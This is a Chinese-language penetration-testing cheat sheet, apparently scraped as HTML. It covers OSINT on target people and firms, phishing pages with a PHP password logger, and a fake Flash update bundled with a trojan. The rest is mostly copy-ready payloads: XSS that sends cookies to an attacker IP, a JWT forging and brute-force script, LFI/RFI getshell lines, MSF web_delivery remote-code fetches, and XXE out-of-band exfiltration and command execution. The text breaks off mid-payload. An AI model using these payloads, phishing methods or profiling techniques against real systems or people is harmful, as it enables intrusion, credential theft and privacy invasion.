title="社交"></a>社交</h2>QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛<br>外网信息<br>有些人喜欢把自己的生活传到外网<br>推特、ins、fb等<h2 id="手机号加入通讯录匹配各个APP用户信息"><a href="#手机号加入通讯录匹配各个APP用户信息" class="headerlink" title="手机号加入通讯录匹配各个APP用户信息"></a>手机号加入通讯录匹配各个APP用户信息</h2><h2 id="注册过的网站"><a href="#注册过的网站" class="headerlink" title="注册过的网站"></a>注册过的网站</h2><a href="https://www.reg007.com/">https://www.reg007.com/</a><br><a href="https://www.usersearch.org/">https://www.usersearch.org/</a><h2 id="目标人员的兴趣"><a href="#目标人员的兴趣" class="headerlink" title="目标人员的兴趣"></a>目标人员的兴趣</h2>  目标人员的兴趣 注册过的小众论坛，站点<br>针对此类站点的深入<br>收集到的用户名，电话等信息生成字典<h2 id="邮箱搜集"><a href="#邮箱搜集" class="headerlink" title="邮箱搜集"></a>邮箱搜集</h2><a href="https://hunter.io/">https://hunter.io/</a><br><a href="https://github.com/killswitch-GUI/SimplyEmail">https://github.com/killswitch-GUI/SimplyEmail</a><h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a><h2 id="验证邮箱是否存在"><a href="#验证邮箱是否存在" class="headerlink" title="验证邮箱是否存在"></a>验证邮箱是否存在</h2><a href="https://tools.verifyemailaddress.io/">https://tools.verifyemailaddress.io/</a><h2 id="历史泄露过的资料等"><a href="#历史泄露过的资料等" class="headerlink" title="历史泄露过的资料等"></a>历史泄露过的资料等</h2>库<br><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a><br><a href="https://github.com/kernelmachine/haveibeenpwned">https://github.com/kernelmachine/haveibeenpwned</a><h2 id="Github-Gitee等代码托管平台"><a href="#Github-Gitee等代码托管平台" class="headerlink" title="Github/Gitee等代码托管平台"></a>Github/Gitee等代码托管平台</h2><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a><br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br><a href="https://github.com/az0ne/Github_Nuggests">https://github.com/az0ne/Github_Nuggests</a><br><a href="https://github.com/mazen160/GithubCloner%E5%85%8B%E9%9A%86%E7%94%A8%E6%88%B7%E7%9A%84github">https://github.com/mazen160/GithubCloner克隆用户的github</a><h2 id="被入侵网址列表"><a href="#被入侵网址列表" class="headerlink" title="被入侵网址列表"></a>被入侵网址列表</h2><a href="http://zone-h.org/archive">http://zone-h.org/archive</a><br>wooyun镜像查找目标企业曾出现的漏洞<h2 id="GPS查询"><a href="#GPS查询" class="headerlink" title="GPS查询"></a>GPS查询</h2><a href="https://www.opengps.cn/Default.aspx">https://www.opengps.cn/Default.aspx</a><h2 id="网站URL提取"><a href="#网站URL提取" class="headerlink" title="网站URL提取"></a>网站URL提取</h2><a href="http://www.bulkdachecker.com/url-extractor/">http://www.bulkdachecker.com/url-extractor/</a><h2 id="蜜罐判断-参考一下即可"><a href="#蜜罐判断-参考一下即可" class="headerlink" title="蜜罐判断(参考一下即可)"></a>蜜罐判断(参考一下即可)</h2><a href="https://honeyscore.shodan.io/">https://honeyscore.shodan.io/</a><h2 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h2><a href="https://default-password.info/">https://default-password.info/</a><br><a href="http://routerpasswords.com/">http://routerpasswords.com</a><h2 id="如需注册"><a href="#如需注册" class="headerlink" title="如需注册"></a>如需注册</h2>Sms<br><a href="https://www.materialtools.com/">https://www.materialtools.com/</a><br><a href="http://receivefreesms.com/">http://receivefreesms.com/</a><br>Email<br><a href="https://10minutemail.net/">https://10minutemail.net/</a><br><a href="https://zh.mytrashmailer.com/">https://zh.mytrashmailer.com/</a><br><a href="http://24mail.chacuo.net/enus">http://24mail.chacuo.net/enus</a><br><a href="https://www.linshiyouxiang.net/">https://www.linshiyouxiang.net/</a><br>Fake id<br><a href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com/</a><br><a href="http://www.haoweichi.com/">http://www.haoweichi.com/</a><br><a href="https://www.fakeaddressgenerator.com/">https://www.fakeaddressgenerator.com/</a><h2 id="企业信息"><a href="#企业信息" class="headerlink" title="企业信息"></a>企业信息</h2>天眼查、企查查、企业信用信息公示系统<br>企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计<h1 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h1><h2 id="win10-安装kali-wsl"><a href="#win10-安装kali-wsl" class="headerlink" title="win10 安装kali(wsl)"></a>win10 安装kali(wsl)</h2>Microsoft Store查找kali下载。<br>Powershell执行<blockquote><p>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux<br>源设置vim /etc/apt/source.list<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>sudo su<br>passwd root修改root密码<br>apt-get update &amp;apt-get upgrade 更新<br>apt-get dist-upgrade<br>apt-get clean<br>cmd&gt;kali config –default-user root 设置默认启动用户为root<br>cmd&gt;net stop/start LxssManager重启服务<br>apt-get install metasploit-framework<br>apt install kali-linux-full 安装完整kali工具集</p></blockquote><h2 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h2><h3 id="XSS克隆钓鱼"><a href="#XSS克隆钓鱼" class="headerlink" title="XSS克隆钓鱼"></a>XSS克隆钓鱼</h3>保存js&amp;css到服务器，登录action改为接受密码的文件action=”./pass.php”<?php //php$user=$_POST['username'];$pass=$_POST['password'];$file=fopen('pass.txt','a+');fwrite($file,$user."|"."pass" . "\n");fclose($file);echo "<script>window.location.href=\"http://192.168.0.1\"</script>\n";?>构造payload<script>window.location.href="http://192.168.0.1/login.html"</script>php –S 0.0.0.0:8080 –t ./<h3 id="伪造页面钓鱼"><a href="#伪造页面钓鱼" class="headerlink" title="伪造页面钓鱼"></a>伪造页面钓鱼</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><a href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a><br>添加xss平台模块<br>window.alert = function(name){<br>var iframe = document.createElement(“IFRAME”);<br>iframe.style.display=”none”;<br>iframe.setAttribute(“src”,’data:text/plain’);<br>document.documentElement.appendChild(iframe);<br>window.frames[0].window.alert(name);<br>iframe.parentNode.removeChild(iframe);<br>}<br>alert(“您的FLASH版本过低，尝试升级后访问该页面！”);<br>window.location.href=”<a href="http://www.flash.com&quot;/">http://www.flash.com&quot;</a>;<br>制作自解压捆绑<br>一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级-&gt;自解压选项，设置解压路径，c:\windows\temp\，设置-&gt;解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。<br>ResourceHacker修改文件图标<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4>if(empty($_COOKIE[‘flash’])){<pre><code>echo &#39;&lt;script&gt;alert(&quot;你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！&quot;);window.location=&quot;http://www.flash.cn.xx.com/&quot;&lt;/script&gt;&#39;;setcookie(&quot;flash&quot;,&quot;true&quot;,time()+30*2400);</code></pre>}<h2 id="对外服务攻击"><a href="#对外服务攻击" class="headerlink" title="对外服务攻击"></a>对外服务攻击</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="前端-逻辑漏洞"><a href="#前端-逻辑漏洞" class="headerlink" title="前端/逻辑漏洞"></a>前端/逻辑漏洞</h4><h5 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h5>任意用户注册<br>可爆破用户名<br>注入<br>XSS<h5 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h5>爆破用户名，密码<br>注入<br>万能密码<br>Xss<br>Xss+Csrf<br>修改返回包信息，登入他人账户<br>修改cookie中的参数，如user,adminid等<h5 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h5>1．重置一个账户，不发送验证码，设置验证码为空发送请求。<br>2．发送验证码，查看相应包<br>3．验证码生存期的爆破<br>4．修改相应包为成功的相应包<br>5．手工直接跳转到校验成功的界面<br>6．两个账户，重置别人密码时，替换验证码为自己正确的验证码<br>7．重置别人密码时，替换为自己的手机号<br>8．重置自己的成功时，同意浏览器重置别人的，不发验证码<br>9．替换用户名，ID，cookie，token参数等验证身份的参数<br>10．通过越权修改他人的找回信息如手机/邮箱来重置<h5 id="信息泄露-1"><a href="#信息泄露-1" class="headerlink" title="信息泄露"></a>信息泄露</h5>HTML源码、JS等查看信息搜集一章<h5 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h5>登录参数修改为注册参数/reg、/register、/sign等<h4 id="JWT攻击手法"><a href="#JWT攻击手法" class="headerlink" title="JWT攻击手法"></a>JWT攻击手法</h4><a href="https://jwt.io/#debugger-io">https://jwt.io/#debugger-io</a><h5 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h5>将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求<h5 id="禁用哈希"><a href="#禁用哈希" class="headerlink" title="禁用哈希"></a>禁用哈希</h5><img src="./img/1.png" alt="image"><br></li></ul><p>  Alg代表加密方式，修改用户名等身份认证的地方，把HS256设置为none生成token发送请求，使用python的pyjwt模块<br><img src="./img/2.png" alt="image"><br></p><p>  jwt.encode({‘user’:’admin’,’arg1’:’value1’,’arg2’:’value2’},algorithm=’none’,key=’’)</p><h5 id="暴破弱密钥"><a href="#暴破弱密钥" class="headerlink" title="暴破弱密钥"></a>暴破弱密钥</h5><blockquote><p>pip3 install pyjwt<br>python3 crack.py<br>  import jwt<br>  import termcolor</p></blockquote><p>  jwt_str = R’token’<br>  with open(‘/root/password.txt’) as f:</p><pre><code>for line in f:key_ = line.strip()try:  jwt.decode(jwt_str,verify=True,key=key_)  print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)  breakexcept(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):  print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)except jwt.exceptions.InvalidSignatureError:  print(&#39;\r&#39;,&#39; &#39; * 64, &#39;\r\btry&#39;,key_,end=&#39;&#39;,flush=True)  continue</code></pre><p>  else:</p><pre><code>print(&#39;\r&#39;,&#39;\bnot found.&#39;)</code></pre><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>  打COOKIE<br>  &lt;svg/onload=”javascript:document.location.href=(‘<a href="http://xx.xx.xx.xx:7777/?cookie=&#39;+document.cookie)&quot;&gt;">http://xx.xx.xx.xx:7777?cookie=&#39;+document.cookie)&quot;&gt;</a><br>  读取HTML<br>  &lt;svg/onload=”document.location=’<a href="http://xx.xx.xx.xx:7777/?&#39;+btoa(document.body.innerHTML)&quot;&gt;">http://xx.xx.xx.xx:7777/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</a><br>  读文件<br>  &lt;svg/onload=”<br>  xmlhttp=new XMLHttpRequest();<br>  xmlhttp.onreadystatechange=function()<br>  {</p><pre><code>  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)  &#123;      document.location=&#39;http://xx.xx.xx.xx:7777/?&#39;+btoa(xmlhttp.responseText);  &#125;</code></pre><p>  }<br>  xmlhttp.open(“GET”,”file.php”,true);<br>  xmlhttp.send();<br>  “&gt;<br>  XSS+SSRF读取服务器文件</p><p>  &lt;svg/onload=”<br>  xmlhttp=new XMLHttpRequest();<br>  xmlhttp.onreadystatechange=function()<br>  {<br>  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)<br>  {</p><pre><code>  document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);</code></pre><p>  }<br>  }<br>  xmlhttp.open(“POST”,”request.php”,true);<br>  xmlhttp.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”);<br>  xmlhttp.send(“url=file:///etc/passwd”);<br>  “&gt;</p><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>  查看有无token等验证身份的参数，删掉后是否返回正常<br>  查看header中referer,origin参数，删掉后是否返回正常<br>  使用csrftester/burpsuite生成表单，以另一账号和浏览器打开测试<br>  去掉referer中域名后面的文件夹或文件<br>  替换二级域名</p><h4 id="php任意文件读取-下载"><a href="#php任意文件读取-下载" class="headerlink" title="php任意文件读取/下载"></a>php任意文件读取/下载</h4><p>  readfile()、file_get_contents()、fopen()等读文件的函数不严谨，读取文件路径可控，输出内容。<br>  下载配置文件<br>  Redis、Weblogic、ftp、mysql、web配置文件、history文件、数据库配置文件<br>  下载log文件<br>  下载web文件<br>  /1.php?f=../../etc/passwd<br>  /1.php?f=file:///etc/passwd(file://绕过../的防护)<br>  /1.php?f=file:///etc/passwd</p><h4 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h4><p>  函数:<br>  include<br>  require<br>  include_once<br>  require_once</p><h5 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h5><p>  file:// — 访问本地文件系统<br>  file协议的工作目录是当前目录，使用file:///wwwroot/1.php等同于./wwwroot/1.php可用于绕过一些情况<br>  php:// — 访问各个输入/输出流（I/O streams）<br><img src="./img/3.png" alt="image"></p><p>  读取<br>  /1.php?file=php://filter/read=convert.base64-encode/resource=./1.php<br>  写入<br>  /1.php?file=php://filter/write=convert.base64-decode/resource=[file]”,”base64</p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>  <a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a></p><h6 id="allow-url-include-开启时Getshell"><a href="#allow-url-include-开启时Getshell" class="headerlink" title="allow_url_include 开启时Getshell"></a>allow_url_include 开启时Getshell</h6><p>  远程文件包含<br>  /1.php?file=<a href="http://remote.com/shell.txt">http://remote.com/shell.txt</a><br>  /1.php?file=php://input  POST:<?php phpinfo();?><br>  或使用curl</p><blockquote><p>curl -v “<a href="http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot;">http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot;</a> -d “<?php phpinfo();?>“<br>  或使用data://协议解析base64的代码<br>  /1.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==</p></blockquote><h6 id="allow-url-include-关闭时Getshell"><a href="#allow-url-include-关闭时Getshell" class="headerlink" title="allow_url_include 关闭时Getshell"></a>allow_url_include 关闭时Getshell</h6><p>  攻击机开启共享<br>  /1.php?file=//attacker/1.php<br>  创建webdav服务，shell文件放入目录包含即可</p><blockquote><p>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 –rm –name webdav bytemark/webdav<br>  Shell文件放入/root/webdav/data<br>  /1.php?file=//attacker/1.php</p></blockquote><h6 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h6><p>  Fuzz文件<br>  <a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br>  <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a><br>  <a href="https://blog.csdn.net/qq_33020901/article/details/78810035">https://blog.csdn.net/qq_33020901/article/details/78810035</a><br>  /1.php?file=<?php phpinfo();?><br>  /1.php?file=../../../../../../../var/log/apache2/access.log<br>  Win下使用phpstudy<br>  请求/<?php phpinfo();?><br>  包含错误日志<br>  /1.php?file=C:\phpStudy\Apache\logs\error.log</p><h6 id="上传个图片格式的木马直接包含"><a href="#上传个图片格式的木马直接包含" class="headerlink" title="上传个图片格式的木马直接包含"></a>上传个图片格式的木马直接包含</h6><p>  /1.php?file=/uploadfile/1.jpg</p><h6 id="限制后缀时"><a href="#限制后缀时" class="headerlink" title="限制后缀时"></a>限制后缀时</h6>  <?php  $file = $_GET['file'].".php";  include($file);  ?><br>  利用伪协议zip，构造一个zip压缩包，打包一个shell.php，将压缩包更名为png![image](./img/4.png)<p>  请求/1.php?file=zip://shell.png%23shell<br><img src="./img/5.png" alt="image"></p><p>  也可使用phar协议访问<br>  /1.php?file=phar://shell.png/shell<br>  老版本可以使用%00截断<br>  /etc/passwd%00<br>  (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)<br>  /var/www/%00<br>  /etc/passwd/././././././.[…]/./././././.<br>  (需要 magic_quotes_gpc=off<br>  (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)<br>  点号截断：<br>  /boot.ini/………[…]…………<br>  (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p><h6 id="phpinfo-LFI-本地文件包含临时文件getshell"><a href="#phpinfo-LFI-本地文件包含临时文件getshell" class="headerlink" title="phpinfo-LFI 本地文件包含临时文件getshell"></a>phpinfo-LFI 本地文件包含临时文件getshell</h6><p>  利用临时文件删除时间差获取shell<br>  需要一个lfi漏洞+phpinfo页面<br>  在/tmp/目录下生成个密码为f的一句话木马g<br><img src="./img/6.png" alt="image"></p><p>  修改脚本的phpinfo文件名称<br><img src="./img/7.png" alt="image"></p><p>  LFI文件<br><img src="./img/8.png" alt="image"></p><p>  执行</p><blockquote><p>python getshell.py 192.168.0.108 80 100<br>  80是端口、100是线程<br><img src="./img/9.png" alt="image"><br><img src="./img/10.png" alt="image"></p></blockquote><p>  <a href="http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27">http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27</a></p><h6 id="session-lfi-getshell"><a href="#session-lfi-getshell" class="headerlink" title="session + lfi getshell"></a>session + lfi getshell</h6><p>  session.upload_progress.enabled启用时，文件上传会产生进度文件<br>  /var/lib/php5/sess_<br>  /var/lib/php/sess_</p><h6 id="LFI-SSH-Log"><a href="#LFI-SSH-Log" class="headerlink" title="LFI SSH Log"></a>LFI SSH Log</h6><blockquote><p>ssh ‘<?php system($_GET['c']); ?>‘@192.168.0.107<br><a href="http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls">http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls</a></p></blockquote><h6 id="RFI-amp-命令注入上线MSF"><a href="#RFI-amp-命令注入上线MSF" class="headerlink" title="RFI&amp;命令注入上线MSF"></a>RFI&amp;命令注入上线MSF</h6><p>  MSF生成<br>  #use exploit/multi/script/web_delivery<br>  #set target PHP<br>  注入点注入：<br>  php -d allow_url_fopen=true -r “eval(file_get_contents(‘<a href="http://192.168.0.107:1234/OgsOFaj3yKH&#39;));&quot;">http://192.168.0.107:1234/OgsOFaj3yKH&#39;));&quot;</a><br>  RFI：<br>  <a href="http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH">http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH</a></p></li></ul><h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><pre><code>XML设计的宗旨是传输数据，而非显示数据XXE=XML外部实体注入、XML=可扩展标记语言Xml文件声明&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;DTD为XML的文档类型定义引入外部DTD&lt;!DOCTYPE 根元素 SYSTEM &quot;filename&quot;&gt;参数实体+外部实体&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;    %file;]&gt;</code></pre><h5 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h5><pre><code>闭合标签，改写xml文件，用户可控，有拼接代码&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;2&quot;&gt;&lt;username&gt;root&lt;/username&gt;&lt;password&gt;root&lt;/password&gt;&lt;/admin&gt;&lt;/manager&gt;若是password可控，拼接代码形成注入admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;</code></pre><h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><pre><code>https://github.com/AonCyberLabs/xxe-recursive-download程序解析XML输入时，未禁止外部实体的加载，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害</code></pre><h6 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h6><pre><code>回显路径    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;test&quot;&gt;%remote;]&gt;DNSLOG    http://www.dnslog.cn/&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY dtd SYSTEM &quot;http://xxx.dnslog.cn/xxe&quot;&gt;]&gt;&lt;xxe&gt;&amp;dtd;&lt;/xxe&gt;Webdav    存在webdav可使用PROPPATCH、PROPFIND、 LOCK等请求方法接受xml输入形成xxeWsdl使用AWVS测试</code></pre><h6 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h6><pre><code>如遇与xml交互的地方&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [  &lt;!ENTITY test &quot;this is test&quot;&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt;看是否输出检查是否支持外部实体&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [  &lt;!ENTITY % foo SYSTEM &quot;http://attacker/evil.xml&quot;&gt; %foo;]&gt; 查看你的服务器是否有请求JSON content-type XXE修改Content-Type: application/xmlX-Requested-With: XMLHttpRequest&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;参数name&gt;name&lt;/参数name&gt;&lt;参数value&gt;&amp;xxe;&lt;/ 参数value&gt;&lt;/root&gt;</code></pre><h6 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:////etc/passwd&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;也可去掉文件列目录file:///root/.sh/id_rsa特殊字符&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:////tmp/xxx.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;evil.dtd&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><h6 id="Blind-OOB-XXE无回显读取"><a href="#Blind-OOB-XXE无回显读取" class="headerlink" title="Blind OOB XXE无回显读取"></a>Blind OOB XXE无回显读取</h6><pre><code>需使用参数实体，引用外部DTDPayload&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;test.dtd&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://attacker:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><h6 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h6><pre><code>远程payload&lt;!ENTITY % a SYSTEM &quot;file:///&quot;&gt; &lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &#39;gopher://ip:80/%a;&#39;&gt;&quot;&gt; %b; %c;注入payload&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://attacker:80/1.xml&quot;&gt;%remote;]&gt;&lt;root/&gt;</code></pre><h6 id="不同平台支持的协议"><a href="#不同平台支持的协议" class="headerlink" title="不同平台支持的协议"></a>不同平台支持的协议</h6><p><img src="./img/11.png" alt="image"></p><h6 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h6><pre><code>安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h6 id="内网主机探测"><a href="#内网主机探测" class="headerlink" title="内网主机探测"></a>内网主机探测</h6><pre><code>可先读取/etc/network/interfaces、/proc/net/arp、/etc/hosts等文件查询IP段使用脚本</code></pre><h6 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;/data&gt;可使用burpsuite的intruder模块进行遍历</code></pre><h6 id="内部DTD利用"><a href="#内部DTD利用" class="headerlink" title="内部DTD利用"></a>内部DTD利用</h6><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h6><pre><code>    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;%local_dtd;</code></pre><h6 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h6><pre><code>&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;%local_dtd;&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;&lt;!ENTITY % condition &#39;aaa)&gt;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;    &lt;!ELEMENT aa (bb&#39;&gt;%local_dtd;]&gt;&lt;message&gt;any text&lt;/message&gt;</code></pre><h6 id="XXE写shell"><a href="#XXE写shell" class="headerlink" title="XXE写shell"></a>XXE写shell</h6><pre><code>当XXE支持XSL时&lt;?xml version=&#39;1.0&#39;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;user&quot;&gt;&lt;![CDATA[public string xml()&#123;    System.Net.WebClient webClient = new System.Net.WebClient();    webClient.DownloadFile(&quot;https://x.x.x.x/shell.txt&quot;,                   @&quot;c:\inetpub\wwwroot\shell.aspx&quot;);return &quot;Exploit Success&quot;;&#125;]]&gt;&lt;/msxsl:script&gt;&lt;xsl:template 